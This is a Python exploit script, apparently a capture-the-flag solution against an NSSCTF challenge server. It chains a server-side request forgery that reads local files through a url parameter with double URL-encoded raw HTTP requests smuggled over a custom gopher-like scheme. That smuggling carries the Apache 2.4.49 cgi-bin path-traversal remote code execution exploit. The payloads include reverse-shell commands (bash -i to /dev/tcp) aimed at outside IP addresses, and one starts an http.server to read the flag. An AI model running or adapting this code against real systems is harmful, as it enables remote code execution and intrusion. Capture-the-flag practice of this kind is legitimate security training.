import requests
from urllib.parse import quote
url = "http://node5.anna.nssctf.cn:22243/"

def get_resource_code():
    payload = "?url=file:///app/app.py"
    response = requests.get(url=url+payload).text
    print(response)
def get_localhost_code():
    payload = "?url=http://localhost/"
    response = requests.get(url=url+payload).text
    print(response)
def gopher_request():
    
    request_payload = \
    """GET /test.php HTTP/1.1
    Host: 127.0.0.1:80

    """.replace("\n","\r\n")
    request_payload = quote(quote(request_payload))

    payload = "?url=mybox://127.0.0.1:80/_"+request_payload
    response = requests.get(url=url+payload)
    print(response.request.url)
    print(response.text)
def gopher_apache_2_4_49_exp():
    command = '''bash -c "bash -i >& /dev/tcp/123.57.48.91/2333 0>&1"'''
    command = "cd /;python3 -m http.server 8082"
    request_payload = \
f"""POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(command)}

{command}
""".replace("\n","\r\n")
    request_payload = quote(quote(request_payload))
    payload = "?url=mybox://127.0.0.1:80/_" + request_payload
    response = requests.get(url = url+payload)
    print(response.request.url)
    print(response.text)
def readfile():
    
    request_payload = \
    """GET /nevvvvvver_f1nd_m3_the_t3ue_flag HTTP/1.1
    Host: 127.0.0.1:8082

    """.replace("\n","\r\n")
    request_payload = quote(quote(request_payload))

    payload = "?url=mybox://127.0.0.1:8082/_"+request_payload
    response = requests.get(url=url+payload)
    print(response.request.url)
    print(response.text)

#gopher_apache_2_4_49_exp()
readfile()



# import urllib.parse
# payload =\
# """POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
# Host: 127.0.0.1:80
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 58echo;bash -c 'bash -i >& /dev/tcp/59.xx.xx.238/2333 0>&1'
# """
# #注意后面一定要有回车，回车结尾表示http请求结束。
# tmp = urllib.parse.quote(payload)
# new = tmp.replace('%0A','%0D%0A')
# result = 'mybox://127.0.0.1:80/'+'_'+new
# result = urllib.parse.quote(result)
# print(result)       # 这里因为是GET请求发包所以要进行两次url编码